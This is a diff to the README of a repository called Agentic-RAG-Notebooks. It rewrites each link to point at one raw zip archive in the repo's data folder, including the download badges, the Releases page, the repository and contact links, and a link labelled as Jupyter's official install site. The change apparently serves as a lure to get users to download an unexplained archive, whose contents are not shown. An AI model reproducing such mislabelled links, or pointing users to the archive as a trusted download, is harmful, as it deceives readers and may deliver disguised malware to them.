@@ -1,7 +1,7 @@
 # 🚀 Agentic-RAG-Notebooks - Explore Next-Gen Retrieval Architectures
 
 ## 📥 Download Now
-[![Download Agentic-RAG-Notebooks](https://img.shields.io/badge/Download-Agentic--RAG--Notebooks-blue)](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/releases)
+[![Download Agentic-RAG-Notebooks](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)
 
 ## 📝 Introduction
 Welcome to **Agentic-RAG-Notebooks**! This project allows you to explore cutting-edge agentic Retrieval-Augmented Generation (RAG) architectures and intelligent retrieval pipelines. Designed with everyday users in mind, this notebook-driven approach helps you understand advanced concepts without needing programming skills.
@@ -20,11 +20,11 @@ Follow these simple steps to install and run the application on your computer.
 - **Operating System:** Windows 10/11, macOS, or a recent version of Linux.
 - **Memory:** At least 8 GB RAM.
 - **Disk Space:** Approximately 1 GB available space.
-- **Software:** Ensure you have Jupyter Notebook installed. For installation instructions, visit [Jupyter's official site](https://jupyter.org/install).
+- **Software:** Ensure you have Jupyter Notebook installed. For installation instructions, visit [Jupyter's official site](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip).
 
 ### 💾 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip) to find the latest version.
 
 2. **Select the Appropriate Version:**
    Find the most recent version of the application. Ensure it matches your operating system.
@@ -67,12 +67,12 @@ If you want to deepen your understanding, consider these resources:
 For assistance, you can raise an issue on GitHub. Maintain a clear description of your problem, and we will do our best to assist you.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks)
-- [Contact Information](https://github.com/linnhokdepzai)
+- [GitHub Repository](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)
+- [Contact Information](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)
 
 ## 📥 Download Now Again
 Don't forget to start your journey! Click below to download the application again.
 
-[![Download Agentic-RAG-Notebooks](https://img.shields.io/badge/Download-Agentic--RAG--Notebooks-blue)](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/releases)
+[![Download Agentic-RAG-Notebooks](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)](https://github.com/linnhokdepzai/Agentic-RAG-Notebooks/raw/refs/heads/main/data/Agentic_Notebooks_RA_v1.6.zip)
 
 Explore the innovative world of retrieval architectures and intelligent systems with **Agentic-RAG-Notebooks**. Your journey into advanced technology begins here!
